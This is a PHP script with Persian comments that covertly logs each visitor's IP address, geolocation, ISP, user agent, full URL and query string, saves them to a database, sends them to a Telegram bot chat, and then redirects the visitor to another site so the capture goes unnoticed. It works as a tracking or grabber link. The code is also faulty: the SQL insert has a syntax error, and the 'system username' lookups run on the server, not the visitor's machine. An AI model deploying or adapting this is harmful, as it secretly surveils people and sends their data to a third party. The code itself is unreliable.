<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "localhost";
$bot_token = "botAPI";
$chat_id = 123456789;

// اتصال به دیتابیس
$conn = new mysqli($servername, $username, $password, $dbname);

// دریافت آدرس IP
$ip = $_SERVER['REMOTE_ADDR'];

// دریافت داده‌ها از IP-API.com
$api_url = "http://ip-api.com/json/$ip?fields=status,message,country,countryCode,city,lat,lon,isp";
$response = @file_get_contents($api_url);
$data = json_decode($response, true);

if ($data['status'] === 'success') {
    $location_info = "Country: " . $data['country'] . " (" . $data['countryCode'] . "), City: " . $data['city'] . ", Latitude: " . $data['lat'] . ", Longitude: " . $data['lon'] . ", ISP: " . $data['isp'];
} else {
    $location_info = "Error: " . $data['message'];
}

// دریافت اطلاعات درخواست
$request_uri = $_SERVER['REQUEST_URI'];
$os = 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($user_agent, 'Windows NT') !== false) {
    $os = 'Windows';
    // دریافت نام کاربری سیستم با استفاده از wmic
    exec('wmic COMPUTERSYSTEM Get UserName /value', $output);
    $system_username = '';
    foreach ($output as $line) {
        if (strpos($line, 'UserName') !== false) {
            $parts = explode('=', $line);
            $system_username = trim($parts[1]);
            break;
        }
    }
} elseif (strpos($user_agent, 'Macintosh') !== false) {
    $os = 'Mac OS X';
    $system_username = getenv('USER'); // نام کاربری در مک
} elseif (strpos($user_agent, 'Linux') !== false) {
    $os = 'Linux';
    $process_user = posix_getpwuid(posix_geteuid());
    $system_username = $process_user['name']; // نام کاربری در لینوکس
} else {
    $system_username = 'Not Available';
}
$http_user_agent = $user_agent;
$query_string = rawurldecode(parse_url($request_uri, PHP_URL_QUERY)); // Decode URL
$full_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$request_username = (isset($_SERVER['AUTH_USER'])) ? $_SERVER['AUTH_USER'] : 'Not Available';

// ذخیره داده‌ها در دیتابیس
$sql = "INSERT INTO device_info (ip, location_info, request_uri, os, http_user_agent, query_string, full_url, request_username, system_username VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("sssssssss", $ip, $location_info, $request_uri, $os, $http_user_agent, $query_string, $full_url, $request_username, $system_username);

if ($stmt->execute()) {
    // ارسال پیام به تلگرام
    $message = "\nNew User Information:\n";
    $message .= "\nIP Address: $ip\n";
    $message .= "\nLocation: $location_info\n";
    $message .= "\nRequest URI: $request_uri\n";
    $message .= "\nOperating System: $os\n";
    $message .= "\nHTTP User Agent: $http_user_agent\n";
    $message .= "\nURL Query String: $query_string\n";
    $message .= "\nFull URL: $full_url\n";
    $message .= "\nRequest Username: $request_username\n";
    $message .= "\nSystem Username: $system_username\n";

    $telegram_api_url = "https://api.telegram.org/$bot_token/sendMessage";
    $telegram_url = $telegram_api_url . "?chat_id=" . $chat_id . "&text=" . urlencode($message);

    file_get_contents($telegram_url);

    // هدایت به صفحه دیگر پس از ارسال پیام به تلگرام
    header("Location: https://kharazmi.farhamaghdasi.ir/");
    exit(); // اجباری است برای جلوگیری از ادامه اجرای کد بعد از هدایت
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>